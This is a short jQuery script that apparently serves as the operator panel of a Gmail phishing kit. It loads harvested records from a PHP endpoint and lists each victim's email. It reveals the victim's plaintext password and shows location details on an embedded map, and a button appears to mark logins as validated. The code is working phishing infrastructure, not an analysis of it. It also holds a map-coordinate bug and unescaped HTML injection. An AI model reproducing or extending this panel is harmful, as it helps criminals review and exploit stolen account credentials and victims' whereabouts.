$.ajax({
    url: 'data.php',
    type: 'GET',
    success: res => {
        $('#contenido').text(JSON.stringify(res));
        res.reverse().forEach(x => {
            var template = `
            <tr id="${x.id}" data-user='${JSON.stringify(x)}'>
                <td class="gmail-pish">${x.username.email}</td>
                <td>
                    <button
                        data-id="${x.id}"
                        onclick="show($(this).attr('data-id'))">
                        Mostrar +
                    </button>
                    <button>Validar</button>
                </td>
            </tr>
            `;
            $('#content').append(template);
        });
    },
    error: e=> {

    }
})

function show(id) {
    var data = $(`#${id}`).data('user');
    $('#id').text(data.id);
    $('#email').text(data.username.email);
    $('#pass').text(data.username.pass);
    $('#date').text(data.date);
    $('#continent').text(data.client.continent);
    $('#country').text(data.client.country);
    $('#province').text(data.client.province);
    $('#district').text(data.client.district);
    var latitude = data.client.latitude;
    var longitude = data.client.longitude;
    var url = `https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3901.95823364335!2d${longitude}!3d${longitude}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMTLCsDAyJzQ3LjAiUyA3N8KwMDInMzQuMSJX!5e0!3m2!1ses-419!2spe!4v1631296952641!5m2!1ses-419!2spe`;
    $('#g-maps').attr('src', url);
    $('#shower').fadeIn();
}